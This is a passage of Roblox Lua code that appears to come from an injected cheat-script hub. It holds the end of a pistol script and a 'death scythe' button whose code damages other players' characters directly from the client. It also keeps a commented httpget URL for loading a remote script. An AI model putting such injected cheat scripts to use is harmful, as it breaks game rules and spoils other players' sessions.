        local spm=Instance.new('SpecialMesh',th)
    	spm.MeshType='Sphere'
    	spm.Scale=Vector3.new(0.05,0.05,0.05)
        spawn(function()
    		for i=1,5 do
    			wait()
    			spm.Scale=spm.Scale+Vector3.new(0.16,0.16,0.16)
    			th.Transparency=th.Transparency+0.2
    		end
    		th:Destroy()
    	end)
        fireSound:Play()
        spawn(function()
            firefx.Transparency=0
            wait()
            firefx.Transparency=1
        end)
        spawn(function()
            flash.Enabled=true
            for i=1,2 do
                wait()
                slideweld1.C0=slideweld1.C0*cfn(0,0,0.22) 
            end
            flash.Enabled=false
            createShell()
            for i=1,2 do
                wait()
                slideweld1.C0=slideweld1.C0*cfn(0,0,-0.22) 
            end
            slideweld1.C0=cfn(0,0.15,0.23)
            if ajar==true then
                out=true
                slideweld1.C0=cfn(0,0.15,0.23)
                slideweld1.C0=slideweld1.C0*cfn(0,0,0.22) 
            end
        end)
        ammocounter.Text=''
        for i=1,magAmmo do
           ammocounter.Text=ammocounter.Text .. 'I' 
        end
        wait()
        Tween(rw,cfn(0,0.7,0)*ang(mr(-100),mr(-30),0),0.62)
        if not grip then
            Tween(lw,cfn(0,0.7,0)*ang(mr(-100),mr(30),0),0.62)
        else
            Tween(lw,cfn(0,1.3,0)*ang(mr(-100),mr(30),0),0.62) 
        end
        wait(0.065)
        restorePosition(0.3)
    else
        if magAmmo<1 then
            slideweld1.C0=cfn(0,0.15,0.23)
            slideweld1.C0=slideweld1.C0*cfn(0,0,0.22)
        end
        emptySound:Play()
    end
    if math.random(jamRate)==jamRate and magAmmo>0 then
        jammed=true
    end
end

debounced=function()
    if sheathed==false and debounce==false then
        return true
    end
end

mouse.Button1Down:connect(function()
    if debounced() then
        if automatic==false then
            debounce=true
            firePistol()
            debounce=false
        else
         heldDown=true 
            firePistol()
        end
    end
end)

mouse.Button1Up:connect(function()
    heldDown=false
end)

sheathGun=function()
    ammocounter.Visible=false
    if laser then
        laserEnabled=false
        aLaser.Transparency=1
    end
    Tween(rw,cfn())
    Tween(lw,cfn())
    wait(0.1)
    mw:Destroy''
    mw=nil
    mw=weld(tor,handle,cfn(1.11,-1.09,0)*ang(mr(-111.5),0,0))
    labr:Destroy()
    rabr:Destroy()
    bg.maxTorque=Vector3.new()
    sheathed=true
end

unsheathGun=function()
    ammocounter.Visible=true
    mw:Destroy''
    mw=nil
    initializeJoints()
    mw=weld(ch['Right Arm'],handle,cfn(-0.4,-1,-0.19)*ang(mr(-101.5),0,0)*cfn()*ang(0,mr(-30),mr(-5)))
    restorePosition()
    bg.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
    sheathed=false
end

laserEnabled=false

mouse.KeyDown:connect(function(key)
    if key=='r' and debounced() then
        debounce=true
        reloadPistol()
        debounce=false
    elseif key=='f' and debounced() then
        debounce=true
        bs=true
        Tween(rw,cfn(0,0.7,0)*ang(mr(-90),mr(-30),0))
        Tween(lw,cfn(0,0.7,0)*ang(mr(-115),mr(35),0))
        wait(0.1)
        spawn(function()
            cockSlide()
        end)
        Tween(lw,cfn(0,0.7,0)*ang(mr(-115),mr(55),0))
        wait(0.3)
        jammed=false
        restorePosition()
        bs=false
        debounce=false
    elseif key=='l' and debounced() then
        if not laserEnabled then
            laserEnabled=true
            aLaser.Transparency=0.35
        else
            laserEnabled=false
            aLaser.Transparency=1
        end
    end
end)

restorePosition=function(speed)
    if not grip then
        Tween(rw,cfn(0,0.7,0)*ang(mr(-90),mr(-30),0),speed)
        Tween(lw,cfn(0,0.7,0)*ang(mr(-90),mr(30),0),speed)
    else
        Tween(rw,cfn(0,0.7,0)*ang(mr(-90),mr(-30),0),speed)
        Tween(lw,cfn(0,1.3,0)*ang(mr(-90),mr(30),0),speed)
    end
end

hopper.Selected:connect(function()
    unsheathGun()
end)

hopper.Deselected:connect(function()
    sheathGun()
end)

game:service'RunService'.RenderStepped:connect(function()
    bg.cframe = CFrame.new(rootpart.Position,mouse.Hit.p*Vector3.new(1,0,1)+rootpart.Position*Vector3.new(0,1,0))
    if laserEnabled==true then
        local user=ch
    	local ray = Ray.new(hole.CFrame.p, (m.Hit.p - hole.CFrame.p).unit*300)
        local hit, position = game.Workspace:FindPartOnRay(ray, user)
        local distance = (position - basehole.CFrame.p).magnitude
        aLaser.Size=Vector3.new(0.2,distance,0.2)
        aLaser.CFrame=CFrame.new(position, basehole.CFrame.p) * CFrame.new(0, 0, -distance/2) * ang(mr(-90),0,0)
    end
    for _,v in pairs(tweenTable) do
        if v.Weld.C1==v.Stop then
            table.remove(tweenTable,_)
        else
            if v.th<0.9 then
                v.th=v.th+v.Step
                i=v.th
                v.Weld.C1 = CFrame.new( (v.Start.p.X * (1 - i)) + (v.Stop.p.X * i), 
                (v.Start.p.Y * (1 - i)) + (v.Stop.p.Y * i), 
                (v.Start.p.Z * (1 - i)) + (v.Stop.p.Z * i)) * CFrame.fromEulerAnglesXYZ(
                (v.X1 * (1 - i)) + (v.X2 * i), (v.Y1 * (1 - i)) + (v.Y2 * i),
                (v.Z1 * (1 - i)) + (v.Z2 * i) )
            else
                v.Weld.C1 = v.Stop
            end
        end
    end
end)
for i=1,magAmmo do
   ammocounter.Text=ammocounter.Text .. 'I' 
end

sheathGun()

spawn(function()
    while wait(0.07) do
        if heldDown==true then
            spawn(function()
                firePistol()
            end)
        end
    end
end)
m.TargetFilter=tube

while wait(0.03) do
    if spread>1 then
       spread=spread-spreadint/4
    end
    if spread<1 then
       spread=1 
    end
    if currentIco>2 then
       switchIco(currentIco-1)
    end
end

--hl/https://httpget-inumeration.c9.io/mp45.lua
--local/game.Players.Conmiro:Destroy''

  	end    

})

Tab:AddButton({

	Name = "死神镰刀（部分游戏）",

	Callback = function()

     Player=game:GetService("Players").LocalPlayer
Character=Player.Character 
PlayerGui=Player.PlayerGui
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head 
Humanoid=Character.Humanoid
m=Instance.new('Model',Character)
LeftArm=Character["Left Arm"] 
LeftLeg=Character["Left Leg"] 
RightArm=Character["Right Arm"] 
RightLeg=Character["Right Leg"] 
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim="Idle"
local Effects={}
local gun=false
local shoot=false
player=nil 
mana=0

mouse=Player:GetMouse()
--save shoulders 
RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
TorsoColor=Torso.BrickColor
function NoOutline(Part)
Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
player=Player 
ch=Character
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 


	local function weldBetween(a, b)
	    local weldd = Instance.new("ManualWeld")
	    weldd.Part0 = a
	    weldd.Part1 = b
	    weldd.C0 = CFrame.new()
	    weldd.C1 = b.CFrame:inverse() * a.CFrame
	    weldd.Parent = a
	    return weldd
	end
	
	function swait(num)
    if num==0 or num==nil then
    game:service'RunService'.Heartbeat:wait(0)
    else
    for i=0,num do
    game:service'RunService'.Heartbeat:wait(0)
    end
    end
	    end
	
	function nooutline(part)
		part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
	end
	
	function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
		local fp=it("Part")
		fp.formFactor=formfactor
		fp.Parent=parent
		fp.Reflectance=reflectance
		fp.Transparency=transparency
		fp.CanCollide=false
		fp.Locked=true
		fp.BrickColor=BrickColor.new(tostring(brickcolor))
		fp.Name=name
		fp.Size=size
		fp.Position=Character.Torso.Position
		nooutline(fp)
		fp.Material=material
		fp:BreakJoints()
		return fp
	end
	
	function mesh(Mesh,part,meshtype,meshid,offset,scale)
		local mesh=it(Mesh)
		mesh.Parent=part
		if Mesh=="SpecialMesh" then
			mesh.MeshType=meshtype
			mesh.MeshId=meshid
		end
		mesh.Offset=offset
		mesh.Scale=scale
		return mesh
	end
	
	function weld(parent,part0,part1,c0,c1)
		local weld=it("Weld")
		weld.Parent=parent
		weld.Part0=part0
		weld.Part1=part1
		weld.C0=c0
		weld.C1=c1
		return weld
	end
	
	
local function CFrameFromTopBack(at, top, back)
local right = top:Cross(back)
return CFrame.new(at.x, at.y, at.z,
right.x, top.x, back.x,
right.y, top.y, back.y,
right.z, top.z, back.z)
end

function Triangle(a, b, c)
local edg1 = (c-a):Dot((b-a).unit)
local edg2 = (a-b):Dot((c-b).unit)
local edg3 = (b-c):Dot((a-c).unit)
if edg1 <= (b-a).magnitude and edg1 >= 0 then
a, b, c = a, b, c
elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
a, b, c = b, c, a
elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
a, b, c = c, a, b
else
assert(false, "unreachable")
end
 
local len1 = (c-a):Dot((b-a).unit)
local len2 = (b-a).magnitude - len1
local width = (a + (b-a).unit*len1 - c).magnitude
 
local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
 
local list = {}
 
if len1 > 0.01 then
local w1 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w1,5)
w1.Material = "SmoothPlastic"
w1.FormFactor = 'Custom'
w1.BrickColor = BrickColor.new("Really red")
w1.Transparency = 0
w1.Reflectance = 0
w1.Material = "Neon"
w1.CanCollide = false
NoOutline(w1)
local sz = Vector3.new(0.2, width, len1)
w1.Size = sz
local sp = Instance.new("SpecialMesh",w1)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
w1:BreakJoints()
w1.Anchored = true
w1.Parent = workspace
w1.Transparency = 0.7
table.insert(Effects,{w1,"Disappear",.01})
w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
table.insert(list,w1)
end
 
if len2 > 0.01 then
local w2 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w2,5)
w2.Material = "SmoothPlastic"
w2.FormFactor = 'Custom'
w2.BrickColor = BrickColor.new("Really red")
w2.Transparency = 0
w2.Reflectance = 0
w2.Material = "Neon"
w2.CanCollide = false
NoOutline(w2)
local sz = Vector3.new(0.2, width, len2)
w2.Size = sz
local sp = Instance.new("SpecialMesh",w2)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
w2:BreakJoints()
w2.Anchored = true
w2.Parent = workspace
w2.Transparency = 0.7
table.insert(Effects,{w2,"Disappear",.01})
w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
table.insert(list,w2)
end
return unpack(list)
end
	
	
so = function(id,par,vol,pit) 
coroutine.resume(coroutine.create(function()
local sou = Instance.new("Sound",par or workspace)
sou.Volume=vol
sou.Pitch=pit or 1
sou.SoundId=id
swait() 
sou:play() 
game:GetService("Debris"):AddItem(sou,6)
end))
end
 
function clerp(a,b,t) 
local qa = {QuaternionFromCFrame(a)}
local qb = {QuaternionFromCFrame(b)} 
local ax, ay, az = a.x, a.y, a.z 
local bx, by, bz = b.x, b.y, b.z
local _t = 1-t
return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 
 
function QuaternionFromCFrame(cf) 
local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
local trace = m00 + m11 + m22 
if trace > 0 then 
local s = math.sqrt(1 + trace) 
local recip = 0.5/s 
return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
else 
local i = 0 
if m11 > m00 then
i = 1
end
if m22 > (i == 0 and m00 or m11) then 
i = 2 
end 
if i == 0 then 
local s = math.sqrt(m00-m11-m22+1) 
local recip = 0.5/s 
return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
elseif i == 1 then 
local s = math.sqrt(m11-m22-m00+1) 
local recip = 0.5/s 
return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
elseif i == 2 then 
local s = math.sqrt(m22-m00-m11+1) 
local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
end 
end 
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w) 
local xs, ys, zs = x + x, y + y, z + z 
local wx, wy, wz = w*xs, w*ys, w*zs 
local xx = x*xs 
local xy = x*ys 
local xz = x*zs 
local yy = y*ys 
local yz = y*zs 
local zz = z*zs 
return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end
 
function QuaternionSlerp(a, b, t) 
local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
local startInterp, finishInterp; 
if cosTheta >= 0.0001 then 
if (1 - cosTheta) > 0.0001 then 
local theta = math.acos(cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((1-t)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta  
else 
startInterp = 1-t 
finishInterp = t 
end 
else 
if (1+cosTheta) > 0.0001 then 
local theta = math.acos(-cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((t-1)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta 
else 
startInterp = t-1 
finishInterp = t 
end 
end 
return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

local function CFrameFromTopBack(at, top, back)
local right = top:Cross(back)
return CFrame.new(at.x, at.y, at.z,
right.x, top.x, back.x,
right.y, top.y, back.y,
right.z, top.z, back.z)
end

--Example: Torso.Weld.C0 = clerp(Torso.Weld.C0, CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)


function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

Damagefunc=function(Part,hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
        if hit.Parent==nil then
                return
        end
        local h=hit.Parent:FindFirstChild("Humanoid")
        for _,v in pairs(hit.Parent:children()) do
        if v:IsA("Humanoid") then
        h=v
        end
        end
        if hit.Parent.Parent:FindFirstChild("Torso")~=nil then
        h=hit.Parent.Parent:FindFirstChild("Humanoid")
        end
        if hit.Parent.className=="Hat" then
        hit=hit.Parent.Parent:findFirstChild("Head")
        end
        if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
        if hit.Parent:findFirstChild("DebounceHit")~=nil then if hit.Parent.DebounceHit.Value==true then return end end
        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
--                        hs(hit,1.2) 
                        local c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game:service("Players").LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                local Damage=math.random(minim,maxim)
--                h:TakeDamage(Damage)
                local  blocked=false
                local  block=hit.Parent:findFirstChild("Block")
                if block~=nil then
                print(block.className)
                if block.className=="NumberValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock==nil then
                block.Value=block.Value-1
                end
                end
                end
                if block.className=="IntValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock~=nil then
                block.Value=block.Value-1
                end
                end
                end
                end
                if blocked==false then
--                h:TakeDamage(Damage)
                h.Health=h.Health-Damage
                ShowDamage((Part.CFrame * CFrame.new(0, 0, (Part.Size.Z / 2)).p + Vector3.new(0, 1.5, 0)), -Damage, 1.5, Part.BrickColor.Color)
                else
                h.Health=h.Health-(Damage/2)
                ShowDamage((Part.CFrame * CFrame.new(0, 0, (Part.Size.Z / 2)).p + Vector3.new(0, 1.5, 0)), -Damage, 1.5, BrickColor.new("Bright blue").Color)
                end
                if Type=="Knockdown" then
                local hum=hit.Parent.Humanoid
hum.PlatformStand=true
coroutine.resume(coroutine.create(function(HHumanoid)
swait(1)
HHumanoid.PlatformStand=false
end),hum)
                local angle=(hit.Position-(Property.Position+Vector3.new(0,0,0))).unit
--hit.CFrame=CFrame.new(hit.Position,Vector3.new(angle.x,hit.Position.y,angle.z))*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
local bodvol=Instance.new("BodyVelocity")
bodvol.velocity=angle*knockback
bodvol.P=5000
bodvol.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
bodvol.Parent=hit
local rl=Instance.new("BodyAngularVelocity")
rl.P=3000
rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
rl.Parent=hit
game:GetService("Debris"):AddItem(bodvol,.5)
game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Normal" then
                local vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                if KnockbackType==1 then
                vp.velocity=Property.CFrame.lookVector*knockback+Property.Velocity/1.05
                elseif KnockbackType==2 then
                vp.velocity=Property.CFrame.lookVector*knockback
                end
                if knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.5)
                elseif Type=="Up" then
                local bodyVelocity=Instance.new("BodyVelocity")
                bodyVelocity.velocity=vt(0,60,0)
                bodyVelocity.P=5000
                bodyVelocity.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
                bodyVelocity.Parent=hit
                game:GetService("Debris"):AddItem(bodyVelocity,1)
                local rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-30,30),math.random(-30,30),math.random(-30,30))
                rl.Parent=hit
                game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Snare" then
                local bp=Instance.new("BodyPosition")
                bp.P=2000
                bp.D=100
                bp.maxForce=Vector3.new(math.huge,math.huge,math.huge)
                bp.position=hit.Parent.Torso.Position
                bp.Parent=hit.Parent.Torso
                game:GetService("Debris"):AddItem(bp,1)
                elseif Type=="Target" then
	            local Targetting = false
                if Targetting==false then
                ZTarget=hit.Parent.Torso
                coroutine.resume(coroutine.create(function(Part) 
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                swait(5)
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                end),ZTarget)
                local TargHum=ZTarget.Parent:findFirstChild("Humanoid")
                local  targetgui=Instance.new("BillboardGui")
                targetgui.Parent=ZTarget
                targetgui.Size=UDim2.new(10,100,10,100)
                local targ=Instance.new("ImageLabel")
                targ.Parent=targetgui
                targ.BackgroundTransparency=1
                targ.Image="rbxassetid://4834067"
                targ.Size=UDim2.new(1,0,1,0)
                cam.CameraType="Scriptable"
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                local dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                Targetting=true
                RocketTarget=ZTarget
                for i=1,Property do
                --while Targetting==true and Humanoid.Health>0 and Character.Parent~=nil do
                if Humanoid.Health>0 and Character.Parent~=nil and TargHum.Health>0 and TargHum.Parent~=nil and Targetting==true then
                swait()
                end
                --workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,Head.CFrame.p+rmdir*100)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)*cf(0,5,10)*euler(-0.3,0,0)
                end
                Targetting=false
                RocketTarget=nil
                targetgui.Parent=nil
                cam.CameraType="Custom"
                end
                end
                        local debounce=Instance.new("BoolValue")
                        debounce.Name="DebounceHit"
                        debounce.Parent=hit.Parent
                        debounce.Value=true
                        game:GetService("Debris"):AddItem(debounce,Delay)
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
        end
end


function ShowDamage(Pos, Text, Time, Color)
	local Rate = (1 / 30)
	local Pos = (Pos or Vector3.new(0, 0, 0))
	local Text = (Text or "")
	local Time = (Time or 2)
	local Color = (Color or Color3.new(1, 0, 0))
	local EffectPart = part("Custom",workspace,"SmoothPlastic",0,1,BrickColor.new(Color),"Effect",vt(0,0,0))
	EffectPart.Anchored = true
	local BillboardGui = Instance.new("BillboardGui")
	BillboardGui.Size = UDim2.new(3, 0, 3, 0)
	BillboardGui.Adornee = EffectPart
	local TextLabel = Instance.new("TextLabel")
	TextLabel.BackgroundTransparency = 1
	TextLabel.Size = UDim2.new(1, 0, 1, 0)
	TextLabel.Text = Text
	TextLabel.TextColor3 = Color
	TextLabel.TextScaled = true
	TextLabel.Font = Enum.Font.ArialBold
	TextLabel.Parent = BillboardGui
	BillboardGui.Parent = EffectPart
	game.Debris:AddItem(EffectPart, (Time + 0.1))
	EffectPart.Parent = game:GetService("Workspace")
	Delay(0, function()
		local Frames = (Time / Rate)
		for Frame = 1, Frames do
			wait(Rate)
			local Percent = (Frame / Frames)
			EffectPart.CFrame = CFrame.new(Pos) + Vector3.new(0, Percent, 0)
			TextLabel.TextTransparency = Percent
		end
		if EffectPart and EffectPart.Parent then
			EffectPart:Destroy()
		end
	end)
end

Handle=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Handle",Vector3.new(0.296501815, 5.18878126, 0.296499223))
Handleweld=weld(m,Character["Right Arm"],Handle,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.10050106, -1.63029861, -0.888347149, -1, 0, 0, 0, 0, -1, -0, -0.999999881, -0))
mesh("CylinderMesh",Handle,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Hitbox=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really red","Hitbox",Vector3.new(0.200000003, 6.98600721, 2.19299841))
Hitboxweld=weld(m,Handle,Hitbox,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -3.93773937, 2.93521118, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Hitbox,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 2.52026534, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, -1.70486319, 3.70584869, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, 0.815379143, 3.85409546, -0.999993443, -5.94257529e-007, -4.47034836e-008, -2.98022105e-008, -6.0737176e-007, -0.999998927, 5.9425787e-007, -0.999993384, 6.66978679e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(1.03775609, 0.311326832, 1.18599701))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.40932465, 3.81469727e-006, -6.91413879e-006, -2.98023295e-008, -1, -0, 1, -2.98023295e-008, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501815, 0.889504969, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.86102295e-006, -1.34825706, -1.8123436, 0.999997854, 1.3482402e-007, 1.3200642e-007, -1.99253947e-009, 0.707105041, -0.707106531, -1.88677433e-007, 0.7071051, 0.707106531))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501815, 0.889504969, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(4.76837158e-006, 1.33309555, -1.79717827, 0.999997854, 7.14049833e-008, 2.88419812e-007, -2.54434127e-007, 0.707104981, 0.707106411, -1.53452262e-007, -0.707104921, 0.707106352))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, -2.44612718, 3.85409546, 0.999993443, 1.43051147e-006, 7.45057918e-008, 4.47034836e-008, 1.49011612e-007, 0.999998868, 1.43051147e-006, -0.999993384, 2.08616129e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.296501756, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -2.37199664, -2.81639481, -0.999993324, -1.35600567e-006, 7.45057918e-008, -4.47034942e-008, -1.49011569e-007, 0.999998868, -1.34110451e-006, 0.999993265, 2.08616129e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(1.90734863e-006, 2.14962149, -2.81639862, 0.999993205, 5.96046448e-007, -4.47034836e-008, 2.98021234e-008, 6.07371646e-007, -0.999998927, -5.96046448e-007, 0.999993205, 6.66978679e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
